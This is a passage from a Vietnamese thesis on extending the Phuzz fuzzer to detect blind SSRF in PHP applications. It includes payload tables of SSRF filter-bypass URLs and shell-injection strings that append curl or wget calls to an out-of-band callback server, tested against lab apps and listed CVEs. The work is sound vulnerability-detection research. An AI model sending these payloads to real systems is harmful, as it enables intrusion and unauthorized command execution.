Hai mươi mốt biến thể được tổ chức thành ba nhóm theo cơ chế định
tuyến tới OOB server, như liệt kê trong Bảng~\ref{tab:ssrf-variants}.
Ký hiệu \texttt{<t>} là viết tắt của token 8 ký tự.

\begin{table}[h]{Các biến thể payload của \texttt{SSRFMutator}}
\label{tab:ssrf-variants}
\centering
\small
\begin{tabular}{|c|p{8.5cm}|p{4.0cm}|}
\hline
\textbf{\#} & \textbf{Payload mẫu} & \textbf{Kỹ thuật bypass} \\
\hline
\multicolumn{3}{|l|}{\textit{Nhóm 1: IP-based — token nhúng trong URL path (biến thể 0–14)}} \\
\hline
0  & \texttt{http://<oob>/<t>}                         & Plain IP \\
1  & \texttt{http://2886795274:8000/<t>}                & Decimal IP \\
2  & \texttt{http://0xac14000a:8000/<t>}                & Hex IP \\
3  & \texttt{http://0254.024.0.012:8000/<t>}            & Octal IP \\
4  & \texttt{http://[::ffff:172.20.0.10]:8000/<t>}      & IPv6 mapped dotted \\
5  & \texttt{http://[::ffff:ac14:a]:8000/<t>}           & IPv6 mapped hex \\
6  & \texttt{http://172.20.0\%2e10:8000/<t>}            & URL-encoded dot \\
7  & \texttt{http://172.20.0\%252e10:8000/<t>}          & Double-encoded dot \\
8  & \texttt{http://x@<oob>/<t>}                        & Userinfo trick \\
9  & \texttt{http://trusted.com@<oob>/<t>}              & Reverse userinfo \\
10 & \texttt{HTTP://<oob>/<t>}                          & Mixed-case scheme \\
11 & \texttt{http://172.20.0.10.:8000/<t>}              & Trailing dot \\
12 & \texttt{http://<oob>/<t>\#trusted.com}             & Fragment bypass \\
13 & \texttt{http://172.20.0.10.nip.io:8000/<t>}        & nip.io DNS redirect \\
14 & \texttt{http://172.20.0.10.sslip.io:8000/<t>}      & sslip.io DNS redirect \\
\hline
\multicolumn{3}{|l|}{\textit{Nhóm 2: DNS-based — token nhúng trong subdomain (biến thể 15–18)}} \\
\hline
15 & \texttt{http://<t>.oob:8000/}                      & Wildcard DNS (\texttt{*.oob}) \\
16 & \texttt{https://<t>.oob:8000/}                     & HTTPS + wildcard DNS \\
17 & \texttt{http://x@<t>.oob:8000/}                    & Userinfo + DNS \\
18 & \texttt{HTTP://<t>.oob:8000/}                      & Mixed-case + DNS \\
\hline
\multicolumn{3}{|l|}{\textit{Nhóm 3: Hostname-based — qua \texttt{/etc/hosts} nội bộ (biến thể 19–20)}} \\
\hline
19 & \texttt{http://oob.phuzz:8000/<t>}                 & Hostname (\texttt{extra\_hosts}) \\
20 & \texttt{oob.phuzz:8443/<t>\#}                      & Scheme-less HTTPS bypass \\
\hline
\end{tabular}
\end{table}

Biến thể 20 (scheme-less) được thiết kế đặc biệt cho các ứng dụng tự
prepend \texttt{https://} vào giá trị tham số trước khi gọi hàm mạng
--- chẳng hạn plugin Canto (\mbox{CVE-2020-28975}), nơi payload plain IP
bị URL parser từ chối vì sai scheme. Đây là minh chứng điển hình cho
sự cần thiết của đa biến thể: một số lỗ hổng chỉ phát hiện được qua
đúng một biến thể nhất định.

% ─────────────────────────────────────────────────────────────
\subsection{CmdInjectionSSRFMutator}
% ─────────────────────────────────────────────────────────────

\texttt{CmdInjectionSSRFMutator} nhắm vào các endpoint mà tham số đầu
vào được truyền vào hàm shell (\texttt{shell\_exec}, \texttt{system},
\texttt{exec}, \texttt{passthru}, \texttt{popen}). Chiến lược là giữ
nguyên giá trị tham số gốc ở đầu payload --- để ứng dụng không báo lỗi
--- rồi nối thêm lệnh \texttt{curl}/\texttt{wget} trỏ tới OOB server
bằng một toán tử tách lệnh shell. Mười biến thể bao phủ các toán tử
phổ biến trên nhiều shell khác nhau (Bảng~\ref{tab:cmdinj-variants}).

\begin{table}[h]{Các biến thể payload của \texttt{CmdInjectionSSRFMutator}}
\label{tab:cmdinj-variants}
\centering
\small
\begin{tabular}{|c|l|p{9.5cm}|}
\hline
\textbf{\#} & \textbf{Toán tử} & \textbf{Payload mẫu} \\
\hline
0 & Semicolon    & \texttt{<val>; curl http://172.20.0.10:8000/<t>} \\
1 & Pipe         & \texttt{<val> | curl -s http://172.20.0.10:8000/<t>} \\
2 & Background   & \texttt{<val>\& curl http://172.20.0.10:8000/<t> \&} \\
3 & Logical-AND  & \texttt{<val> \&\& curl http://172.20.0.10:8000/<t>} \\
4 & Subshell     & \texttt{<val> \$(curl -s http://172.20.0.10:8000/<t>)} \\
5 & Backtick     & \texttt{<val> `curl -s http://172.20.0.10:8000/<t>`} \\
6 & wget         & \texttt{<val>; wget -q -O- http://172.20.0.10:8000/<t>} \\
7 & Newline      & \texttt{<val>}\textbackslash\texttt{ncurl http://172.20.0.10:8000/<t>} \\
8 & Null-byte    & \texttt{<val>\%00; curl http://172.20.0.10:8000/<t>} \\
9 & Hostname     & \texttt{<val>; curl http://oob.phuzz:8000/<t>} \\
\hline
\end{tabular}
\end{table}

Biến thể 4 (subshell \texttt{\$()}) và biến thể 5 (backtick) đặc biệt
hữu ích khi bộ lọc đầu vào chặn dấu chấm phẩy và dấu pipe nhưng bỏ
sót command substitution. Biến thể 8 (null-byte \texttt{\%00}) nhắm vào
các ứng dụng C/PHP tách chuỗi tại ký tự null. Biến thể 9 dùng hostname
\texttt{oob.phuzz} thay vì IP để vượt qua bộ lọc chặn địa chỉ RFC-1918
ở tầng shell.

% ─────────────────────────────────────────────────────────────
\subsection{Tích hợp vào Fuzzer}
% ─────────────────────────────────────────────────────────────

\texttt{SSRFMutator} được tích hợp vào \texttt{SingleMutator} qua lazy
import, đặt cùng danh sách với các \texttt{ParamMutator} gốc của Phuzz:

\begin{verbatim}
class SingleMutator(Mutator):
    def __init__(self):
        self.param_mutators = [
            IterateCharParamMutator(), AddCharParamMutator(),
            EquallyRandomCharParamMutator(), ...
            SuperRandomMutator()
        ]
        try:
            from ssrf_mutator import SSRFMutator
            self.param_mutators.append(SSRFMutator())
        except ImportError:
            pass
\end{verbatim}

Danh sách được xáo trộn ngẫu nhiên mỗi vòng iteration. Vì
\texttt{SSRFMutator} là một trong 13 mutator, xác suất mỗi lần đột biến
chọn \texttt{SSRFMutator} là khoảng $\frac{1}{13} \approx 7.7\%$.

Ngoài ra, hệ thống cung cấp hai mutator chuyên biệt:
\texttt{SSRFOnlyMutator} (mọi đột biến đều dùng \texttt{SSRFMutator})
và \texttt{CmdInjSSRFOnlyMutator} (mọi đột biến đều dùng
\texttt{CmdInjectionSSRFMutator}), dùng cho các endpoint mà người dùng
biết chắc là SSRF sink và muốn tập trung toàn bộ ngân sách đột biến vào
kiểm thử SSRF.

% ============================================================
\section{Cơ chế Phát hiện Hai Tầng và Chấm điểm}
\label{sec:feedback-impl}
% ============================================================

\subsection{SSRFVulnCheck: Kiểm tra Hai Tầng}

\texttt{SSRFVulnCheck} triển khai giao diện \texttt{VulnCheck} với phương
thức \texttt{check(candidate)}. Toàn bộ logic dựa trên đọc file từ
shared-tmpfs, không có blocking I/O hay network call:

\begin{verbatim}
def check(self, candidate) -> bool:
    # Tầng 1: PHP hook có ghi nhận không?
    hook_file = f"/shared-tmpfs/ssrf-hooks/{candidate.coverage_id}.json"
    if not os.path.isfile(hook_file):
        return False
    with open(hook_file) as fh:
        hook_data = json.load(fh)

    # Trích xuất token từ đối số hàm mạng
    argument = hook_data.get("argument", "")
    token = self._extract_token(argument)
    if not token:
        return False

    # Tầng 2: OOB server đã nhận callback không?
    oob_file = f"/shared-tmpfs/oob-logs/{token}.json"
    if not os.path.isfile(oob_file):
        return False

    # Xác nhận: cả hai tín hiệu đều có mặt
    candidate.score += SSRF_CRITICAL_SCORE  # += 1000
    ...
    return True
\end{verbatim}

Thiết kế \textit{AND logic} --- yêu cầu cả hai file tồn tại --- là yếu tố
cốt lõi loại bỏ false positive: Tầng 1 đơn độc chỉ chứng minh payload SSRF
đã lan truyền tới hàm mạng; Tầng 2 đơn độc có thể có false positive nếu
OOB server nhận kết nối từ nguồn khác. Sự kết hợp của cả hai mới là bằng
chứng đầy đủ của một lỗ hổng SSRF.

\begin{figure}[htbp]
    \centering
    % Mô tả hình: Flowchart logic phát hiện hai tầng của SSRFVulnCheck.
    % Bắt đầu: hình elip "check(candidate)".
    % Bước 1: hình thoi "ssrf-hooks/<covID>.json tồn tại?"
    %   → Không: hình chữ nhật "return False" (kết thúc).
    %   → Có: tiếp tục.
    % Bước 2: hình chữ nhật "Đọc argument từ hook file".
    % Bước 3: hình thoi "Trích được token từ argument?"
    %   → Không: "return False".
    %   → Có: tiếp tục.
    % Bước 4: hình thoi "oob-logs/<token>.json tồn tại?"
    %   → Không: "return False".
    %   → Có: tiếp tục.
    % Bước 5: hình chữ nhật "Tăng score += 1000, ghi ssrf-error-reports/".
    % Kết thúc: hình elip "return True (SSRF xác nhận)".
    % Ghi chú bên cạnh bước 4: "Tầng 2: OOB callback = bằng chứng mạng thực tế".
    % Ghi chú bên cạnh bước 1: "Tầng 1: PHP hook đã kích hoạt".
    \includegraphics[width=0.60\textwidth]{figures/fig-detection-flow}
    \caption{Sơ đồ luồng phát hiện lỗ hổng của \texttt{SSRFVulnCheck}.}
    \label{fig:detection-flow}
\end{figure}

\subsection{Trích xuất Token từ Payload}

Hàm \texttt{\_extract\_token()} xử lý đặc điểm riêng của từng nhóm biến thể
payload:

\begin{verbatim}
@staticmethod
def _extract_token(url: str) -> "str | None":
    # Xử lý Command Injection: trích URL từ lệnh shell
    if not lower.startswith(("http://", "https://", "ftp://")):
        m = re.search(r'https?://\S+', lower)
        if m:
            url = m.group(0)

    parsed = urlparse(url.lower())
    hostname = (parsed.hostname or "").rstrip(".")  # bỏ trailing dot

    # IP-based: token ở path segment đầu tiên
    if hostname == OOB_HOST:
        return parsed.path.strip("/").split("/")[0].split("#")[0] or None

    # DNS-based: token ở subdomain trái nhất của *.oob
    if hostname.endswith(f".{OOB_DOMAIN}"):
        return hostname.split(".")[0] or None

    # nip.io / sslip.io: OOB_HOST là prefix của hostname
    if hostname.startswith(f"{OOB_HOST}."):
        return parsed.path.strip("/").split("/")[0].split("#")[0] or None

    # Hostname-based: oob.phuzz → token ở path
    if hostname == OOB_HOSTNAME:
        return parsed.path.strip("/").split("/")[0].split("#")[0] or None
\end{verbatim}

Hai điểm kỹ thuật đáng chú ý: (1) \texttt{.rstrip(".")} xử lý biến thể
trailing dot (variant 11) khi PHP trả lại URL với dấu chấm thừa; (2) xử lý
Command Injection dùng \texttt{re.search} tìm URL được nhúng trong chuỗi
lệnh shell trước khi parse.

\subsection{Chấm điểm và Báo cáo}

Khi xác nhận SSRF, \texttt{SSRFVulnCheck} thực hiện ba hành động:

\begin{enumerate}
    \item \textbf{Tăng điểm}: \texttt{candidate.score += 1000}
    (\texttt{SSRF\_CRITICAL\_SCORE}). Điểm cao đảm bảo ứng viên SSRF được
    ưu tiên chọn trong các vòng lặp tiếp theo để tiếp tục đào sâu.
    \item \textbf{Ghi report}: JSON report với các trường \texttt{type},
    \texttt{candidateID}, \texttt{payload}, \texttt{url},
    \texttt{hookedFunction} được ghi vào
    \texttt{/shared-tmpfs/ssrf-error-reports/<candidateID>.json}.
    \item \textbf{Trả về \texttt{True}}: để framework Phuzz ghi nhận
    ứng viên vào \texttt{vulnerable\_candidates['SSRF']}.
\end{enumerate}

% ============================================================
\section{Tích hợp vào Vòng lặp Fuzz Chính}
\label{sec:integration}
% ============================================================

\subsection{Điểm Tích hợp trong fuzzer.py}

Tích hợp SSRF vào \texttt{fuzzer.py} được thực hiện tại hai điểm khởi tạo
trong hàm \texttt{\_\_init\_\_} của lớp \texttt{Fuzzer}:

\begin{verbatim}
from ssrf_vulncheck import SSRFVulnCheck
...
self.vulnchecker = ParamBasedVulnChecker(
    mysql_errors_folder=...,
    shell_errors_folder=...,
    ...
)
self.vulnchecker.vuln_checkers.append(
    SSRFVulnCheck(ssrf_errors_folder=self.ssrf_errors_folder)
)
\end{verbatim}

\texttt{SSRFVulnCheck} được append vào danh sách
\texttt{ParamBasedVulnChecker.vuln\_checkers} --- danh sách này được duyệt
tuần tự sau mỗi request. Không cần sửa đổi logic của
\texttt{ParamBasedVulnChecker}: SSRF hoạt động hoàn toàn như một plugin độc
lập.

\subsection{Luồng Thực thi Đầy đủ}

Hình~\ref{fig:sequence-ssrf} mô tả luồng thực thi đầy đủ từ khi fuzzer chọn
ứng viên đến khi xác nhận lỗ hổng SSRF qua cơ chế hai tầng.

\begin{figure}[htbp]
    \centering
    % Mô tả hình: Sequence diagram đầy đủ của một chu kỳ phát hiện SSRF.
    % Các thực thể (cột từ trái sang phải, mỗi cột là một thanh dọc):
    %   SingleMutator | Fuzzer | phuzz-web (PHP) | phuzz-oob (Flask) | shared-tmpfs | SSRFVulnCheck
    % Luồng thông điệp theo số thứ tự:
    %   1. Fuzzer → SingleMutator: mutate(candidate).
    %   2. SingleMutator → SSRFMutator: mutate("old_value") — chọn ngẫu nhiên.
    %   3. SSRFMutator → SSRFMutator: sinh token "ab12cd34", lưu token_map.
    %   4. SSRFMutator → Fuzzer: trả về payload "http://172.20.0.10:8000/ab12cd34".
    %   5. Fuzzer → phuzz-web: HTTP POST [X-Fuzzer-Covid: req-001] url="http://172.20.0.10:8000/ab12cd34".
    %   6. phuzz-web → phuzz-web: PHP hook UOPZ kích hoạt → ghi ssrf-hooks/req-001.json.
    %   7. phuzz-web → phuzz-oob: GET /ab12cd34 HTTP/1.1 (PHP thực sự gọi file_get_contents).
    %   8. phuzz-oob → phuzz-oob: extract_token("/ab12cd34") = "ab12cd34".
    %   9. phuzz-oob → shared-tmpfs: write oob-logs/ab12cd34.json (atomic rename).
    %   10. phuzz-oob → phuzz-web: HTTP 200 OK.
    %   11. phuzz-web → phuzz-web: ghi coverage-reports/req-001.json.
    %   12. phuzz-web → Fuzzer: HTTP 200 OK (response bình thường, không có dấu hiệu SSRF).
    %   13. Fuzzer → SSRFVulnCheck: check(candidate "req-001").
    %   14. SSRFVulnCheck → shared-tmpfs: đọc ssrf-hooks/req-001.json → token="ab12cd34".
    %   15. SSRFVulnCheck → shared-tmpfs: đọc oob-logs/ab12cd34.json → EXISTS!
    %   16. SSRFVulnCheck → Fuzzer: True — ghi ssrf-error-reports/req-001.json.
    \includegraphics[width=\textwidth]{figures/fig-sequence-ssrf}
    \caption{Sequence diagram một chu kỳ phát hiện Blind SSRF.}
    \label{fig:sequence-ssrf}
\end{figure}

\begin{enumerate}
    \item Fuzzer chọn ứng viên $c$ từ hàng đợi; \texttt{SingleMutator} sinh
    đột biến $c'$ bằng cách chọn ngẫu nhiên \texttt{SSRFMutator} trong số
    13 mutator.
    \item \texttt{SSRFMutator.mutate()} sinh token 8 ký tự, lưu vào
    \texttt{\_token\_map}, trả về payload OOB theo biến thể round-robin.
    \item Fuzzer thêm header \texttt{X-Fuzzer-Covid: <ID>} và gửi HTTP
    request tới \texttt{phuzz-web}.
    \item PHP đọc \texttt{\$\_SERVER['HTTP\_X\_FUZZER\_COVID']} →
    \texttt{\_\_FUZZER\_\_COVID = <ID>}. \texttt{08\_ssrf.php} đã hook sẵn
    các hàm mạng.
    \item Khi ứng dụng gọi, ví dụ,
    \texttt{file\_get\_contents(\$\_GET['url'])} với URL là payload OOB:
    hook UOPZ kích hoạt \texttt{\_\_fuzzer\_\_ssrf\_log()} → ghi
    \texttt{ssrf-hooks/<ID>.json}.
    \item Đồng thời, PHP thực hiện HTTP request tới OOB server.
    Flask trên \texttt{phuzz-oob} nhận request → trích token → ghi
    \texttt{oob-logs/<token>.json}.
    \item Fuzzer nhận HTTP response; \texttt{ParamBasedVulnChecker} gọi
    \texttt{SSRFVulnCheck.check(c')}:
    (a) đọc \texttt{ssrf-hooks/<ID>.json} → lấy argument → trích token;
    (b) kiểm tra \texttt{oob-logs/<token>.json};
    (c) nếu cả hai tồn tại: xác nhận SSRF, tăng điểm 1000, ghi report.
    \item Fuzzer ghi nhận $c'$ vào \texttt{vulnerable\_candidates['SSRF']};
    ứng viên được giữ lại trong pool với điểm cao để tiếp tục đào sâu.
\end{enumerate}

\subsection{Xử lý Bất đồng bộ}

Bước 6 và bước 7 có thể không diễn ra theo đúng thứ tự: request SSRF do PHP
thực hiện đôi khi đến OOB server sau khi fuzzer đã kiểm tra
\texttt{oob-logs/<token>.json} (vì background job xử lý chậm). Trong
trường hợp này, \texttt{SSRFVulnCheck.check()} trả về \texttt{False} ở
lần kiểm tra đầu tiên.

Tuy nhiên, hook file \texttt{ssrf-hooks/<ID>.json} vẫn tồn tại và ứng viên
được giữ trong pool. Vào vòng lặp fuzz tiếp theo, nếu ứng viên được chọn lại
và gửi thêm đột biến, VulnChecker sẽ kiểm tra lại. Hơn nữa, vì token nằm
trong \texttt{\_token\_map}, fuzzer có thể bổ sung logic tra cứu trễ
(\textit{deferred lookup}) trong các vòng lặp sau.

\section{Tổng kết Chương}

Chương này đã trình bày đầy đủ cả lý thuyết lẫn cài đặt của hệ thống đề xuất.

SSRF là lớp lỗ hổng phức tạp với nhiều vector tấn công, đặc biệt nguy hiểm
trong hệ sinh thái PHP do tính năng stream wrapper và sự phổ biến của
WordPress API. Dạng Blind SSRF không để lại bất kỳ dấu hiệu trong HTTP
response hay coverage --- kênh OOB là tín hiệu duy nhất có khả năng xác nhận
lỗ hổng này. Cơ chế token-based correlation đảm bảo mỗi phát hiện được gắn
chính xác với ứng viên đã kích hoạt nó, loại trừ false positive ngay trong
môi trường song song.

Bốn container Docker phối hợp qua shared-tmpfs volume và mạng nội bộ cố định,
tạo ra hạ tầng hoàn chỉnh cho phát hiện Blind SSRF. Hook PHP (23 hook trên
5 nhóm hàm) thu thập tín hiệu in-band ngay tại thời điểm ứng dụng gọi hàm
mạng với payload của fuzzer. OOB server (Flask + dnsmasq, ghi log nguyên tử)
cung cấp tín hiệu out-of-band độc lập và không thể giả mạo. Bộ đột biến 21
biến thể bao phủ hầu hết các kỹ thuật bypass SSRF phổ biến. Logic AND hai
tầng của \texttt{SSRFVulnCheck} đảm bảo không có false positive.

Chương~4 sẽ đánh giá hiệu quả của hệ thống này trên các ứng dụng thực tế.

\chapter{Thực nghiệm và Đánh giá}

Chương này trình bày kết quả thực nghiệm của hệ thống đề xuất trên 14 ca
kiểm thử, gồm tám ứng dụng lab và sáu CVE thực tế.
Phần~\ref{sec:exp-env} mô tả môi trường và thiết lập thực nghiệm.
Phần~\ref{sec:exp-targets} liệt kê toàn bộ mục tiêu.
Phần~\ref{sec:exp-lab} trình bày kết quả nhóm lab.
Phần~\ref{sec:exp-cve} phân tích từng CVE.
Phần~\ref{sec:exp-summary} tổng hợp và đánh giá.

% ============================================================
\section{Môi trường Thực nghiệm}
\label{sec:exp-env}
% ============================================================

\subsection{Cấu hình phần cứng và phần mềm}

Toàn bộ thực nghiệm được thực hiện trên một máy tính với hệ điều hành
Ubuntu 22.04 LTS, CPU Intel Core i7 thế hệ 12, RAM 32 GB. Mỗi ca kiểm
thử được khởi tạo độc lập bằng lệnh:

\begin{verbatim}
docker compose -f docker-compose.<target>.yml up --build
\end{verbatim}

đảm bảo trạng thái sạch (clean state) trước mỗi lần chạy. Giới hạn
thời gian tối đa là 600 giây mỗi ca kiểm thử. Bảng~\ref{tab:env} tóm
tắt cấu hình môi trường.

\begin{table}[h]{Cấu hình môi trường thực nghiệm}
\label{tab:env}
\centering
\begin{tabular}{|l|l|}
\hline
\textbf{Thành phần} & \textbf{Chi tiết} \\
\hline
Hệ điều hành    & Ubuntu 22.04 LTS \\
CPU             & Intel Core i7 thế hệ 12 \\
RAM             & 32 GB \\
Docker          & Docker Engine 24.x \\
PHP web server  & Apache 2.4, PHP 7.4 / 8.2 (tùy target) \\
Database        & MySQL 8 (khi cần) \\
Giới hạn thời gian & 600 giây/ca kiểm thử \\
Subnet Docker   & \texttt{172.20.0.0/24}, OOB server IP \texttt{172.20.0.10} \\
\hline
\end{tabular}
\end{table}

\subsection{Cấu hình Fuzzer}

Hệ thống sử dụng Phuzz mở rộng với \texttt{SSRFMutator} và
\texttt{SSRFVulnCheck} đã tích hợp như mô tả ở Chương~3. Hai chế độ
hoạt động được dùng tùy loại target:

\begin{itemize}
    \item \texttt{"ssrf\_only": true} --- toàn bộ đột biến dùng
    \texttt{SSRFMutator} (21 biến thể OOB). Áp dụng cho các endpoint
    nhận URL hoặc đường dẫn trực tiếp.
    \item \texttt{"cmdi\_ssrf\_only": true} --- toàn bộ đột biến dùng
    \texttt{CmdInjectionSSRFMutator} (10 biến thể shell injection). Áp
    dụng cho các endpoint truyền tham số vào lệnh shell.
\end{itemize}

21 biến thể của \texttt{SSRFMutator} được tổ chức thành ba nhóm: biến
thể IP-based (v0--v14, sử dụng IP 172.20.0.10 dưới các dạng mã hóa
khác nhau), biến thể DNS-based (v15--v18, token nằm trong subdomain và
được phân giải qua dnsmasq wildcard \texttt{*.oob}), và biến thể
hostname-based (v19--v20, dùng hostname \texttt{oob.phuzz} được phân
giải qua \texttt{extra\_hosts} trong Docker).

\subsection{Đường cơ sở so sánh}

Mỗi ca kiểm thử được chạy với hai cấu hình để xác định đóng góp của
hệ thống đề xuất:

\begin{itemize}
    \item \textbf{Phuzz gốc (P)}: không có \texttt{SSRFMutator} /
    \texttt{SSRFVulnCheck}; chỉ dùng tín hiệu coverage và exception.
    \item \textbf{Phuzz+SSRF (P+S)}: bản mở rộng đầy đủ với tín hiệu
    OOB.
\end{itemize}

Kết quả của Phuzz gốc trên toàn bộ 14 ca: \textbf{0 lỗ hổng SSRF được
phát hiện} --- xác nhận thực nghiệm rằng tín hiệu exception và coverage
không đủ để phát hiện Blind SSRF.

% ============================================================
\section{Danh sách Mục tiêu Thực nghiệm}
\label{sec:exp-targets}
% ============================================================

Bảng~\ref{tab:lab-targets} và Bảng~\ref{tab:cve-targets} liệt kê toàn
bộ 14 mục tiêu, phân loại theo nhóm lab và CVE.

\begin{table}[h]{Danh sách ứng dụng lab được kiểm thử}
\label{tab:lab-targets}
\centering
\small
\begin{tabular}{|c|l|l|l|l|}
\hline
\textbf{STT} & \textbf{Ứng dụng} & \textbf{Endpoint (param)} & \textbf{Sink} & \textbf{Mutator} \\
\hline
L1 & XVWA \texttt{ssrf\_xspa}
   & \texttt{POST img\_url=}
   & \texttt{curl\_exec}
   & SSRFMutator \\
L2 & Pikachu SSRF (2 ep.)
   & \texttt{GET ?url=} / \texttt{GET ?file=}
   & \texttt{curl\_exec} / \texttt{fgc}
   & SSRFMutator \\
L3 & ssrf-lab (2 ep.)
   & \texttt{POST handler=} (basic + bypass)
   & \texttt{curl\_exec}
   & SSRFMutator \\
L4 & SSRF\_Vul\_Lab (2 ep.)
   & \texttt{POST file=} (fgc + dns\_rebinding)
   & \texttt{file\_get\_contents}
   & SSRFMutator \\
L5 & BTSLab SSRF
   & \texttt{POST url=}
   & \texttt{file\_get\_contents}
   & SSRFMutator \\
L6 & DVWA Cmd Inject.
   & \texttt{POST ip=}
   & \texttt{shell\_exec}
   & CmdInjSSRF \\
L7 & bWAPP RFI
   & \texttt{GET ?language=}
   & \texttt{include(http://)}
   & SSRFMutator \\
L8 & Mutillidae RFI
   & \texttt{GET ?page=}
   & \texttt{require\_once(http://)}
   & SSRFMutator \\
\hline
\end{tabular}
\end{table}

\begin{table}[h]{Sáu CVE được kiểm thử}
\label{tab:cve-targets}
\centering
\small
\begin{tabular}{|c|l|l|l|l|}
\hline
\textbf{STT} & \textbf{CVE} & \textbf{Ứng dụng} & \textbf{Endpoint} & \textbf{Sink} \\
\hline
C1 & CVE-2020-7071
   & PHP \texttt{filter\_var} app
   & \texttt{GET ?url=}
   & \texttt{file\_get\_contents} \\
C2 & CVE-2020-24148
   & Import XML Feed (WP)
   & \texttt{POST data=} (AJAX)
   & \texttt{file\_get\_contents} \\
C3 & CVE-2020-28975
   & Canto 1.3.0 \texttt{tree.php}
   & \texttt{GET ?subdomain=}
   & \texttt{curl\_exec} \\
C4 & CVE-2021-32682
   & elFinder $<$ 2.1.59
   & \texttt{GET ?url=}
   & \texttt{file\_get\_contents} \\
C5 & CVE-2022-1751
   & WP Skitter Slideshow
   & \texttt{GET ?image=}
   & \texttt{getimagesize} \\
C6 & CVE-2023-2249
   & wpForo (WP)
   & \texttt{POST image\_blob=}
   & \texttt{file\_get\_contents} \\
\hline
\end{tabular}
\end{table}

Lưu ý: CVE-2020-28975 thuộc plugin Canto 1.3.0 có ba file PHP đều dễ
bị tấn công theo cùng cơ chế --- \texttt{tree.php} (CVE-2020-28975),
\texttt{detail.php} (CVE-2020-28976), \texttt{get.php}
(CVE-2020-28977). Thực nghiệm kiểm thử đại diện qua \texttt{tree.php};
hai file còn lại chia sẻ cùng vector tấn công và không cần kiểm thử
riêng. CVE-2021-21311 (Adminer Elasticsearch) không được đưa vào do
Adminer throw \texttt{TypeError} trên PHP 8.2 trước khi đạt tới code
path SSRF.

% ============================================================
\section{Kết quả Nhóm Lab}
\label{sec:exp-lab}
% ============================================================

\subsection{Kết quả tổng hợp}

Bảng~\ref{tab:lab-results} trình bày kết quả phát hiện cho tám ứng dụng
lab, bao gồm 11 endpoint-level test run (ba ứng dụng L2, L3, L4 mỗi
ứng dụng có hai endpoint riêng biệt).

\begin{table}[h]{Kết quả phát hiện SSRF trên nhóm lab}
\label{tab:lab-results}
\centering
\small
\begin{tabular}{|c|l|l|l|c|c|}
\hline
\textbf{ID} & \textbf{Ứng dụng} & \textbf{Biến thể phát hiện} & \textbf{Hook function} & \textbf{P+S} & \textbf{P} \\
\hline
L1 & XVWA ssrf\_xspa
   & v0 (plain IP)
   & \texttt{curl\_exec}
   & \checkmark & \ding{55} \\
L2 & Pikachu (2 ep.)
   & v0 (cả 2 endpoint)
   & \texttt{curl\_exec} / \texttt{fgc}
   & \checkmark & \ding{55} \\
L3 & ssrf-lab (2 ep.)
   & v0 (basic), v1 (bypass)
   & \texttt{curl\_exec}
   & \checkmark & \ding{55} \\
L4 & SSRF\_Vul\_Lab (2 ep.)
   & v0 (fgc), v15 (dns)
   & \texttt{file\_get\_contents}
   & \checkmark & \ding{55} \\
L5 & BTSLab SSRF
   & v0 (plain IP)
   & \texttt{file\_get\_contents}
   & \checkmark & \ding{55} \\
L6 & DVWA Cmd Inject.
   & Ck (semicolon)
   & \texttt{shell\_exec}
   & \checkmark & \ding{55} \\
L7 & bWAPP RFI
   & v0 (plain IP)
   & stream wrapper \texttt{http://}
   & \checkmark & \ding{55} \\
L8 & Mutillidae RFI
   & v0 (plain IP)
   & stream wrapper \texttt{http://}
   & \checkmark & \ding{55} \\
\hline
\multicolumn{4}{|l|}{\textbf{Tổng (8 ứng dụng / 11 endpoint)}}
   & \textbf{8/8} & \textbf{0/8} \\
\hline
\end{tabular}
\end{table}

\subsection{Phân tích từng ứng dụng}

\textbf{XVWA (L1).} XVWA SSRF XSPA (Cross-Site Port Attack) là mô-đun
SSRF của ứng dụng eXtremely Vulnerable Web Application, trong đó tham
số \texttt{img\_url} được truyền trực tiếp vào \texttt{curl\_exec} mà
không có bất kỳ kiểm tra nào. Biến thể v0 (plain IP) kích hoạt hook
ngay trong vòng lặp đầu tiên của fuzzer.

\textbf{Pikachu (L2).} Pikachu có hai module SSRF riêng biệt đóng vai
trò sanity check: \texttt{ssrf\_curl.php} nhận tham số \texttt{url} rồi
truyền vào \texttt{curl\_exec}, và \texttt{ssrf\_fgc.php} nhận tham số
\texttt{file} rồi truyền vào \texttt{file\_get\_contents}. Cả hai
endpoint không có cơ chế lọc, đều phát hiện với v0. Trường hợp này xác
nhận rằng hai sink function phổ biến nhất (\texttt{curl\_exec} và
\texttt{file\_get\_contents}) đều được hook và phát hiện đúng.

\textbf{ssrf-lab (L3).} ssrf-lab cung cấp hai endpoint trên cùng file
\texttt{testhook.php}: endpoint \textit{basic} (không có filter) và
endpoint \textit{advanced1} (có filter đơn giản dựa trên chuỗi IP).
Endpoint basic phát hiện với v0. Endpoint advanced1 chặn các chuỗi chứa
dạng IP thập phân phân cách dấu chấm (\texttt{172.x.x.x}); biến thể v1
(decimal encoding: \texttt{http://2886795274:8000/<token>}, trong đó
2886795274 = 172.20.0.10 dưới dạng số nguyên 32-bit) vượt qua filter và
kích hoạt \texttt{curl\_exec}. Trường hợp này minh họa cơ chế bypass
cơ bản nhất: filter kiểm tra chuỗi thay vì kiểm tra giá trị IP đã chuẩn
hóa.

\textbf{SSRF\_Vulnerable\_Lab (L4).} Ứng dụng có hai endpoint:
\texttt{file\_get\_content.php} (endpoint fgc, không có filter) và
\texttt{dns\_rebinding.php} (mô phỏng tình huống có cơ chế kiểm tra
hostname). Endpoint fgc phát hiện với v0. Endpoint dns\_rebinding sử
dụng biến thể v15 --- payload dạng \texttt{http://<token>.oob:8000/},
trong đó token nằm trong subdomain; dnsmasq trong Docker network phân
giải wildcard \texttt{*.oob $\rightarrow$ 172.20.0.10}, cho phép OOB
callback đến đích mà không cần truyền IP nội bộ trực tiếp trong URL.
Endpoint này được cấu hình với \texttt{request\_timeout: 15} giây để
chờ DNS resolution hoàn tất.

\textbf{BTSLab (L5).} BTSLab yêu cầu đăng nhập trước khi truy cập
endpoint SSRF. Fuzzer sử dụng module \texttt{btslab\_requests} để tự
động đăng nhập và lưu session cookie \texttt{PHPSESSID}, sau đó đột
biến tham số \texttt{url} tại \texttt{/vulnerability/ssrf/ssrf.php}.
Sink function là \texttt{file\_get\_contents}; phát hiện với v0.

\textbf{DVWA Command Injection (L6).} Đây là trường hợp SSRF gián tiếp:
endpoint thực thi \texttt{shell\_exec('ping -c 4 ' . \$target)} ---
tham số \texttt{ip} do người dùng kiểm soát được nhúng trực tiếp vào
lệnh shell. \texttt{CmdInjectionSSRFMutator} sinh payload semicolon:
\texttt{127.0.0.1; curl http://172.20.0.10:8000/<token>}, khiến shell
thực thi lệnh \texttt{curl} sau \texttt{ping}. Hook trên
